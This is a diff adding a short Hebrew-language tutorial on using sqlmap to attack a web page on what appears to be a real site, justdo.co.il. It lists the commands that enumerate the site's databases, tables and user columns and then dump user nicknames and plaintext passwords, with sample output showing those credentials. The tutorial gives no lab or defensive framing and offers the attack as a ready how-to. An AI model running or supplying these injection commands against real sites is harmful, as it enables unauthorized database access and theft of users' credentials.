@@ -1,0 +1,85 @@
+
+עדכון
+
+sqlmap update
+
+sqlmap
+
+קבלת רשימת בסיסי נתונים
+
+sqlmap -u http://justdo.co.il/list-of-guides.php?subject=2 --dbs
+
+נקבל את הרשימה הבאה לדוגמא 
+
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+
+נבחר באחד מבסיסי הנתונים בשביל למשוך את הטבלאות
+
+
+sqlmap -u http://justdo.co.il/list-of-guides.php?subject=2 -D diyhtml --tables
+
+נקבל את רשימת הטבלאות
++-------------+
+| accessories |
+| guides      |
+| subjects    |
+| users       |
++-------------+
+
+נבחר באחת הטבלאות ונמשוך את העמודות 
+
+
+sqlmap -u http://justdo.co.il/list-of-guides.php?subject=2 -D diyhtml -T users --columns
+
+
+נקבל רשימת העמודות של ה users
+
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| country   | text    |
+| email     | text    |
+| firstname | text    |
+| id        | int(11) |
+| lastname  | text    |
+| nickname  | text    |
+| password  | text    |
+| type      | text    |
++-----------+---------+
+
+
+כעת נמשוך את כל השורות של nickname
+
+sqlmap -u http://justdo.co.il/list-of-guides.php?subject=2 -D diyhtml -T users -C nickname --dump
+
+
+
++----------+
+| nickname |
++----------+
+| bob      |
+| boze     |
+| boze2    |
++----------+
+
+נעשה זאת שוב עם הסיסמאות 
+
+
+sqlmap -u http://justdo.co.il/list-of-guides.php?subject=2 -D diyhtml -T users -C password --dump
+
+
++----------+
+| password |
++----------+
+| 123      |
+| 1234     |
+| boze!qaz |
++----------+
+
+
+
+
+
